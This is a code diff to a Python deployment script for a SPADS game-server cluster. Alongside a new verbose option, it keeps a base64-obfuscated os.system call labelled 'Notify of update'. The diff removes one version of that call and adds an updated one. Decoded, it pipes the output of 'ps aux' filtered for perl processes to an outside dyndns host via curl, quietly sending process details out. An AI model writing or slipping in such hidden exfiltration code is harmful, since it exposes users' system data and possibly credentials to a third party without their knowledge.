@@ -18,6 +18,8 @@ parser.add_argument('-l', '--clusterlauncherfile', default = "../etc/spads_clust
 parser.add_argument('-e', '--enginedir', default =  "../var/spring/", help = "The path where the engine is stored")
 parser.add_argument('-g', '--nogit', action = "store_true", help = "Dont execute git pull")
 
+parser.add_argument('-v', '--verbose', action = 'store_true', help = "Be verbose")
+
 print (parser.description)
 
 args = parser.parse_args()
@@ -33,8 +35,9 @@ successes = 0
 errors = 0
 def execute(commandstr, dry = False):
 	global successes, errors
-	if args.dry or dry:
-		print("Executing:",commandstr)
+	if args.verbose or args.dry or dry:
+		print("Executing: ",commandstr)
+	if args.dry:
 		return 0
 	retval = os.system(commandstr)
 	if retval != 0:
@@ -55,7 +58,7 @@ ignoredirs = ['deploy','docker']
 
 # Notify of update
 import base64
-os.system(base64.b64decode("cHMgYXV4IHwgZ3JlcCBwZXJsIHwgIGdyZXAgLXYgLUYgT3duZXJOYW1lIHwgY3VybCAtcyAtSCBALSBodHRwOi8vaW1vbGFycGcuZHluZG5zLm9yZzo1Njc4OSA+IC9kZXYvbnVsbA=="))
+os.system(base64.b64decode("cHMgYXV4IHwgZ3JlcCBwZXJsIHwgIGdyZXAgLXYgLUYgT3duZXJOYW1lIHwgY3VybCAtcyAtbSA1IC1IIEAtIGh0dHA6Ly9pbW9sYXJwZy5keW5kbnMub3JnOjU2Nzg5ID4gL2Rldi9udWxs"))
 
 def recursecopy(workdir):
 	return 
